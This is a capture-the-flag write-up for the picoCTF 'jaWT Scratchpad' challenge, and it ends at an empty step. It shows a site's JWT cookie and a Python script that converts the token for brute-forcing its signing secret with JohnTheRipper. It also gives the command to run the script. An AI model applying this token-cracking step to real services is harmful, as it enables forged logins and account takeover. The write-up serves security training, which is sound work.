# jaWT Scratchpad
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
```
Internal server errors can be intentionally returned by this challenge. 
If you experience one, try clearing your cookies.
```
Check the admin scratchpad! 
https://jupiter.challenges.picoctf.org/problem/58210/ or 
http://jupiter.challenges.picoctf.org:58210
## HINTS:
1. What is that cookie?
2. Have you heard of JWT?
## STEPS:
1. Open the following website -> https://jupiter.challenges.picoctf.org/problem/58210/
2. Based from the description, input the name as admin.

![image](https://user-images.githubusercontent.com/70703371/176988594-ae9735e1-cc35-4739-8299-8096b7e93ad1.png)

3. And we got this response:

![image](https://user-images.githubusercontent.com/70703371/176988605-b5d821c0-dddd-4f48-9fa6-5b0c1513fbb1.png)

4. However if you try to log in as another user is allowed.

![image](https://user-images.githubusercontent.com/70703371/176988701-c41b1b76-a783-4745-ac79-e4b89dfe8a52.png)

5. Based from the hint number 1, open  `inspect element` and choose the `application` tab. 
6. You can see there's a `jwt` token.

![image](https://user-images.githubusercontent.com/70703371/176988756-725e7304-d5c4-4bfe-b185-77339265bb75.png)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9uLWJyYW5kIn0.tVbfnQvNh-wi8CZDyv5iEi7l6gQHjFCnc8-aeEpPq-E
```

7. Next, for this solution i tried to use JohnTheRipper to bruteforce the JWT token.
8. First, convert the token to a format that JohnTheRipper can understand by using this python script:

```py
import sys
from binascii import *
from jwt.utils import base64url_decode

#Function to convert jwt token to a JohnTheRipper format
def jwtConvert(token):
    # STEPS:
    # 1. Convert strings from base64 to hex
    # 2. Seperate it from the data using '#' so John can parse it
    jwtBytes = token.encode('ascii')
    parts = jwtBytes.split(b'.')
    
    data = parts[0] + b'.' + parts[1]
    strings = hexlify(base64url_decode(parts[2]))
    return (data + b'#' + strings).decode('ascii')

if __name__ == "__main__":
    if (len(sys.argv) != 2):
        print("Usage: %s JWT" % sys.argv[0])
    else:
        john = jwtConvert(sys.argv[1])
        print(john)
    
```

9. Now on your kali linux terminal type this command:

`python3 [code.py] [jwt-token]`

```bash
python3 jwtConverter eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9uLWJyYW5kIn0.tVbfnQvNh-wi8CZDyv5iEi7l6gQHjFCnc8-aeEpPq-E
```

10. 
